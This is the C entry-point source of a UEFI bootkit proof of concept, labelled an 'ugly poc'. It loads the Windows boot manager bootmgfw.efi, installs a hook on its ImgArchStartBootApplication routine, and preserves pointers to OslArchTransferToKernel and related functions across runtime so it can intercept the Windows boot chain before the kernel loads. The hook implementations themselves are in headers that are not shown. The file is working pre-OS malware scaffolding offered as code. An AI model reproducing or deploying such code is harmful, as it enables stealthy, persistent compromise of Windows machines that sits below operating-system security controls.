#include <Uefi.h>

#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>

#include <Protocol/LoadedImage.h>

#include <Guid/EventGroup.h>
#include "globals.h"

#include "utils.h"
#include "hooks.h"
//ugly poc written in 2 days

#define BOOTMGFW_PATH	L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi"

CONST UINT32	_gUefiDriverRevision = 0x200;
CONST UINT32	_gDxeRevision = 0x200;

CONST UINT8		_gDriverUnloadImageCount = 1;

CHAR8*		gEfiCallerBaseName			= "IRFDSERVICE";
EFI_EVENT	gSetVirtualAddressMapEvent	= NULL;

VOID
EFIAPI
NotifySetVirtualAddressMap(
	IN EFI_EVENT  Event,
	IN VOID* Context
) {
	gRT->ConvertPointer(EFI_OPTIONAL_PTR, (VOID**)&gJmpToImgArchStartBootApplication);
	gRT->ConvertPointer(EFI_OPTIONAL_PTR, (VOID**)&gCallToOslArchTransferToKernel);
	gRT->ConvertPointer(EFI_OPTIONAL_PTR, (VOID**)&gBlImgAllocateImageBuffer);
	gRT->ConvertPointer(EFI_OPTIONAL_PTR, (VOID**)&oImgArchStartBootApplication);
	gRT->ConvertPointer(EFI_OPTIONAL_PTR, (VOID**)&oOslArchTransferToKernel);
}

EFI_STATUS
EFIAPI
UefiMain(
IN EFI_HANDLE		 ImageHandle,
IN EFI_SYSTEM_TABLE* SystemTable
) {
	EFI_STATUS	efiStatus	= EFI_INVALID_PARAMETER;

	EFI_LOADED_IMAGE*	localImageInfo			= NULL;
	EFI_DEVICE_PATH*	windowsBootloaderPath	= NULL;
	EFI_HANDLE			windowsBootloaderHandle = NULL;

	efiStatus = gBS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (VOID**)&localImageInfo);

	if (EFI_ERROR(efiStatus)) {
		return efiStatus;
	}

	efiStatus = BkLocateFile(BOOTMGFW_PATH, &windowsBootloaderPath);

	if (EFI_ERROR(efiStatus)) {
		return efiStatus;
	}
	
	efiStatus = gBS->LoadImage(TRUE, ImageHandle, windowsBootloaderPath, NULL, 0, &windowsBootloaderHandle);

	if (EFI_ERROR(efiStatus)) {
		return efiStatus;
	}

	efiStatus = gBS->CreateEventEx(EVT_NOTIFY_SIGNAL, TPL_NOTIFY, NotifySetVirtualAddressMap, NULL, &gEfiEventVirtualAddressChangeGuid, &gSetVirtualAddressMapEvent);
	
	if (EFI_ERROR(efiStatus)) {
		return efiStatus;
	}

	efiStatus = InstallImgArchStartBootApplicationHook(localImageInfo->ImageBase, windowsBootloaderHandle);

	if (EFI_ERROR(efiStatus)) {
		return efiStatus;
	}
	
	efiStatus = gBS->StartImage(windowsBootloaderHandle, (UINTN*)NULL, (CHAR16 * *)NULL);

	if (EFI_ERROR(efiStatus)) {
		return efiStatus;
	}
	
	return efiStatus;
}

EFI_STATUS
EFIAPI
UefiUnload(
	IN EFI_HANDLE ImageHandle
) {

}